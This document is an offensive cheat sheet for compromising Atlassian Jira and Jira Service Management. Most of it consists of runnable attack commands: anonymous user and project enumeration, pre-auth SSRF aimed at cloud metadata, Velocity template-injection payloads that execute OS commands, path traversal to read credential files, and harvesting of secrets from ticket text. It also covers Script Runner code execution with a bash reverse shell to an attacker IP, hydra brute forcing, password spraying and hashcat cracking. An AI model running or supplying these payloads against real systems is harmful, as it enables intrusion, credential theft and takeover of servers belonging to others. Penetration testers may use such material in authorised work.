# Jira / Jira Service Management

## What is it?
Atlassian Jira — widely deployed project tracking and ticketing platform. Jira Service Management (formerly Service Desk) adds ITSM features. Attack surface: unauthenticated REST API access, SSRF via gadget proxy, SSTI/RCE via admin templates, auth bypass CVEs, credential harvesting from ticket content, and Script Runner Groovy execution.

Deployment types:
- **Jira Server** (self-hosted, EOL Jan 2024 — many unpatched installs)
- **Jira Data Center** (self-hosted HA)
- **Jira Cloud** (Atlassian-managed — reduced attack surface)

---

## Ports

| Port | Protocol | Service |
|------|----------|---------|
| 8080 | TCP | Jira default HTTP |
| 8443 | TCP | Jira default HTTPS |
| 80/443 | TCP | Behind reverse proxy |

---

## Enumeration

```bash
# Banner / version grab
curl -sk https://<target>/rest/api/2/serverInfo
curl -sk https://<target>/rest/api/2/serverInfo | jq '{version:.version, deploymentType:.deploymentType, baseUrl:.baseUrl}'

# Check anonymous access to REST API
curl -sk https://<target>/rest/api/2/project | jq '.[].key'   # list all visible projects
curl -sk https://<target>/rest/api/2/user/search?username= | jq '.[].name'   # user enumeration

# Check issue visibility (anonymous)
curl -sk "https://<target>/rest/api/2/search?jql=project=<PROJECT>&maxResults=50"

# Enumerate users via REST
curl -sk "https://<target>/rest/api/2/user/search?username=a&maxResults=1000"
curl -sk "https://<target>/rest/api/2/user/search?username=&maxResults=1000" | jq '.[].emailAddress'

# Check for user registration endpoint
curl -sk https://<target>/secure/Signup!default.jspa

# Check for login page / version in source
curl -sk https://<target>/login.jsp | grep -i 'version\|atlassian-token\|jira'
curl -sk https://<target>/ | grep -i 'version'

# Shodan dorks
http.title:"Jira" product:"Atlassian Jira"
http.favicon.hash:"-1791346703"   # Jira favicon hash
```

---

## CVEs

| CVE | Affected | Description | Impact |
|-----|----------|-------------|--------|
| CVE-2019-11581 | Server/DC < 8.4.0 | SSTI in email templates — admin or contact form | RCE |
| CVE-2019-8451 | Server < 8.4.0 | SSRF via `/plugins/servlet/gadgets/makeRequest` | Pre-auth SSRF |
| CVE-2022-0540 | Server/DC (various) | Auth bypass in Seraph — unauthenticated WebWork action access | Auth Bypass |
| CVE-2021-26086 | Server/DC < 8.15.0 | Path traversal — read arbitrary files without auth | Info Disc |
| CVE-2022-26135 | Mobile plugin < 3.0 | Full read SSRF via mobile plugin endpoint | Pre-auth SSRF |
| CVE-2021-39115 | JSM Data Center < 4.13.2 | Command injection in Jira Service Management | RCE |
| CVE-2023-22501 | JSM Cloud | Broken auth — account takeover via email token | Account Takeover |

---

## CVE-2019-8451 — Pre-Auth SSRF

```bash
# SSRF via gadget proxy endpoint — no auth required
# Endpoint: /plugins/servlet/gadgets/makeRequest
curl -sk "https://<target>/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Internal service access
curl -sk "https://<target>/plugins/servlet/gadgets/makeRequest?url=http://internal-service:8080/"

# Read file (if gopher scheme supported)
curl -sk "https://<target>/plugins/servlet/gadgets/makeRequest?url=file:///etc/passwd"

# Check for other SSRF-vulnerable endpoints
curl -sk "https://<target>/plugins/servlet/Wallboard/?dashboardId=10000&cyclePeriod=10&jiraUrl=http://169.254.169.254/"
```

---

## CVE-2022-0540 — Authentication Bypass (Seraph)

```bash
# Seraph auth bypass — access WebWork actions without authentication
# Vulnerable: various Jira Server/DC versions

# Check if vulnerable — access an admin-only action without creds:
curl -sk "https://<target>/secure/WsSingleSignOnSessionCreate.jspa"
curl -sk "https://<target>/secure/admin/XsrfErrorPage.jspa"

# Bypass via URL manipulation (action name capitalization trick)
curl -sk "https://<target>/secure/WsSingleSignOnSessionCreate!default.jspa"

# Seraph bypass pattern — append suffix to action
curl -sk "https://<target>/secure/ConfigurePortalPages!default.jspa%3bjsessionid=xxx"

# Check if user enumeration possible via auth bypass
curl -sk "https://<target>/rest/gadget/1.0/login?username=admin&password=test"
```

---

## CVE-2019-11581 — SSTI / RCE via Email Templates

```bash
# Requires: admin access OR "Contact Administrators" form enabled (default in many installs)
# Server < 8.4.0

# Check if contact form is enabled (no auth)
curl -sk "https://<target>/secure/ContactAdministrators!default.jspa"

# If contact form enabled — inject SSTI payload in "Subject" or "Body" field
# Jira uses Velocity templating engine — ${...} syntax

# Test payload (blind — will appear in error or email)
curl -sk -X POST "https://<target>/secure/ContactAdministrators.jspa" \
  -d "atl_token=<token>&from=attacker@evil.com&subject=\${7*7}&body=test&Send=Send"

# RCE payload (Velocity template injection)
# ${class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}

# With admin access — inject via Notification Templates:
# Admin → System → Notification Templates → Edit
# Insert: ${request.getSession().getServletContext().getClassLoader().loadClass("java.lang.Runtime").getMethod("exec","".class).invoke(request.getSession().getServletContext().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## CVE-2021-26086 — Path Traversal (Pre-Auth File Read)

```bash
# Read arbitrary files without authentication
# Jira Server/DC < 8.15.0 (with specific plugins)

# Windows path traversal
curl -sk "https://<target>/s/xxx/_/%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd"
curl -sk "https://<target>/%2F..%2F..%2Fetc/passwd" --path-as-is

# Read Jira config files
curl -sk "https://<target>/secure/attachment/../../../../dbconfig.xml" --path-as-is
curl -sk "https://<target>/../../../atlassian-jira/WEB-INF/classes/jira-application.properties" --path-as-is

# High-value Jira files
# WEB-INF/classes/jira-application.properties — JIRA home dir
# <jira-home>/dbconfig.xml — database credentials
# <jira-home>/jira.cfg.xml
# <jira-home>/export/*.zip — backup files with all data
```

---

## CVE-2022-26135 — Mobile Plugin SSRF (Pre-Auth)

```bash
# Full read SSRF via Jira mobile plugin — no authentication required
# Affected: mobile-for-jira plugin < 3.0.0

# SSRF to internal network
curl -sk -X POST "https://<target>/rest/nativemobile/1.0/batch" \
  -H "Content-Type: application/json" \
  -d '{"requests":[{"path":"https://169.254.169.254/latest/meta-data/","method":"GET"}]}'

# SSRF to internal Jira admin endpoints
curl -sk -X POST "https://<target>/rest/nativemobile/1.0/batch" \
  -H "Content-Type: application/json" \
  -d '{"requests":[{"path":"http://localhost:8080/secure/admin/ViewSystemInfo.jspa","method":"GET"}]}'
```

---

## Authenticated Enumeration & Credential Harvesting

```bash
# Login — get session cookie
RESPONSE=$(curl -sk -X POST "https://<target>/rest/auth/1/session" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' -c cookies.txt -v 2>&1)
SESSION=$(grep -i 'set-cookie' <<< "$RESPONSE" | grep JSESSIONID | awk '{print $2}')

# List all projects
curl -sk "https://<target>/rest/api/2/project" \
  -H "Authorization: Basic $(echo -n 'user:pass' | base64)"

# Search ALL issues (may include passwords, API keys in ticket text)
curl -sk "https://<target>/rest/api/2/search?jql=text~'password'&maxResults=50" \
  -H "Authorization: Basic $(echo -n 'user:pass' | base64)" | \
  jq '.issues[].fields | {summary:.summary, description:.description}'

# Search for credentials in tickets
for keyword in password passwd secret token apikey "api key" credential aws_access ssh; do
  echo "=== $keyword ==="
  curl -sk "https://<target>/rest/api/2/search?jql=text~'$keyword'&maxResults=10&fields=summary,description" \
    -H "Authorization: Basic $(echo -n 'user:pass' | base64)" | \
    jq '.issues[].fields.summary'
done

# Get all attachments (may contain config files, creds)
curl -sk "https://<target>/rest/api/2/search?jql=project=<PROJECT>&fields=attachment&maxResults=100" \
  -H "Authorization: Basic $(echo -n 'user:pass' | base64)" | \
  jq '.issues[].fields.attachment[] | {filename:.filename, content:.content}'

# Enumerate all users with admin
curl -sk "https://<target>/rest/api/2/user/search?username=&maxResults=1000" \
  -H "Authorization: Basic $(echo -n 'user:pass' | base64)" | \
  jq '.[] | {name:.name, email:.emailAddress, active:.active}'

# Get application links (reveals connected services — Confluence, Bitbucket, etc.)
curl -sk "https://<target>/rest/applinks/1.0/applicationlink" \
  -H "Authorization: Basic $(echo -n 'admin:admin' | base64)"
```

---

## Script Runner Plugin — Groovy RCE

Script Runner is a very common Jira plugin that allows Groovy script execution. With admin access, this = OS command execution.

```bash
# Check if Script Runner is installed
curl -sk "https://<target>/rest/scriptrunner/latest/status" \
  -H "Authorization: Basic $(echo -n 'admin:pass' | base64)"

# Execute Groovy via Script Runner console (admin required)
# UI: Admin → Script Runner → Script Console

# Direct API execution
curl -sk -X POST "https://<target>/rest/scriptrunner/latest/custom/exec" \
  -H "Authorization: Basic $(echo -n 'admin:pass' | base64)" \
  -H "Content-Type: application/json" \
  -d '{"script":"[\"id\", \"whoami\"].execute().text"}'

# Reverse shell via Script Runner
curl -sk -X POST "https://<target>/rest/scriptrunner/latest/custom/exec" \
  -H "Authorization: Basic $(echo -n 'admin:pass' | base64)" \
  -H "Content-Type: application/json" \
  -d '{"script":"[\"bash\",\"-c\",\"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\"].execute()"}'

# Read files via Script Runner
curl -sk -X POST "https://<target>/rest/scriptrunner/latest/custom/exec" \
  -H "Authorization: Basic $(echo -n 'admin:pass' | base64)" \
  -H "Content-Type: application/json" \
  -d '{"script":"new File(\"/etc/passwd\").text"}'
```

---

## Database Credentials (Post-Access)

```bash
# dbconfig.xml — contains DB credentials
# Jira Home directory (check jira-application.properties first)
curl -sk "https://<target>/rest/api/2/settings/baseUrl" \
  -H "Authorization: Basic $(echo -n 'admin:pass' | base64)"

# Common Jira home locations:
# Linux: /var/atlassian/application-data/jira/
#        /opt/atlassian/jira/
# Windows: C:\Program Files\Atlassian\Application Data\JIRA\

# Read dbconfig.xml (if file read available)
cat /var/atlassian/application-data/jira/dbconfig.xml
# Contains: <username>, <password> (cleartext), <url> (JDBC connection string)

# Read via Script Runner
curl -sk -X POST "https://<target>/rest/scriptrunner/latest/custom/exec" \
  -H "Authorization: Basic $(echo -n 'admin:pass' | base64)" \
  -H "Content-Type: application/json" \
  -d '{"script":"new File(\"/var/atlassian/application-data/jira/dbconfig.xml\").text"}'

# Jira exports (backup archives — contain ALL data including hashed passwords)
# Admin → System → Backup System
ls /var/atlassian/application-data/jira/export/*.zip

# User password hashes from DB (if you have DB access)
# Jira uses Atlassian PBKDF2 or MD5 depending on version
# hashcat mode 12477 (PBKDF2-SHA256 Atlassian)
hashcat -m 12477 '<hash>' /usr/share/wordlists/rockyou.txt
```

---

## Brute Force & Default Creds

```bash
# Default credentials to try
# admin:admin   admin:password   admin:jira   admin:<company>   admin:<company>123

# Brute force login via REST API
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  <target> https-post-form \
  "/rest/auth/1/session:username=^USER^&password=^PASS^:Unauthorized" \
  -t 4 -W 3

# Check for lockout policy first
curl -sk -X POST "https://<target>/rest/auth/1/session" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass"}' | jq '.errorMessages'

# Password spray (avoid lockout)
for user in admin jira service support help; do
  curl -sk -X POST "https://<target>/rest/auth/1/session" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"$user\"}" | grep -v "Unauthorized" && echo "[HIT] $user"
done
```

---

## Webhook Abuse (SSRF)

```bash
# Jira webhooks fire HTTP requests — create one to pivot SSRF (requires create-webhook permission)
curl -sk -X POST "https://<target>/rest/webhooks/1.0/webhook" \
  -H "Authorization: Basic $(echo -n 'user:pass' | base64)" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test",
    "url": "http://169.254.169.254/latest/meta-data/",
    "events": ["jira:issue_created"],
    "filters": {}
  }'

# Trigger webhook by creating an issue
curl -sk -X POST "https://<target>/rest/api/2/issue" \
  -H "Authorization: Basic $(echo -n 'user:pass' | base64)" \
  -H "Content-Type: application/json" \
  -d '{"fields":{"project":{"key":"<PROJECT>"},"summary":"test","issuetype":{"name":"Task"}}}'
```

---

## Dangerous Configurations

| Config | Risk |
|--------|------|
| Anonymous access to projects | Unauthenticated ticket/user enumeration |
| Public signup enabled | Create account → access internal projects |
| Script Runner installed (admin) | Admin creds = OS RCE |
| Contact Administrators form enabled | SSTI/RCE vector (CVE-2019-11581) |
| Jira Server < 8.20 LTS | Multiple critical unpatched CVEs |
| Plaintext passwords in ticket descriptions | Credential harvesting without exploit |
| DB credentials in dbconfig.xml readable | Full database access |
| Application links (OAuth) to Confluence | Lateral movement to connected services |
| Service account with domain admin | Compromise extends beyond Jira |

---

## Quick Reference

```bash
# Version check (no auth)
curl -sk https://<target>/rest/api/2/serverInfo | jq '{version:.version}'

# User enum (no auth)
curl -sk "https://<target>/rest/api/2/user/search?username=&maxResults=100" | jq '.[].name'

# CVE-2019-8451 SSRF
curl -sk "https://<target>/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/"

# Search tickets for credentials (authenticated)
curl -sk "https://<target>/rest/api/2/search?jql=text~'password'&maxResults=50" \
  -H "Authorization: Basic $(echo -n 'user:pass' | base64)" | jq '.issues[].fields.summary'

# Script Runner RCE (admin)
curl -sk -X POST "https://<target>/rest/scriptrunner/latest/custom/exec" \
  -H "Authorization: Basic $(echo -n 'admin:pass' | base64)" \
  -H "Content-Type: application/json" \
  -d '{"script":"[\"id\"].execute().text"}'

# DB creds via Script Runner
curl -sk -X POST "https://<target>/rest/scriptrunner/latest/custom/exec" \
  -H "Authorization: Basic $(echo -n 'admin:pass' | base64)" \
  -H "Content-Type: application/json" \
  -d '{"script":"new File(\"/var/atlassian/application-data/jira/dbconfig.xml\").text"}'
```
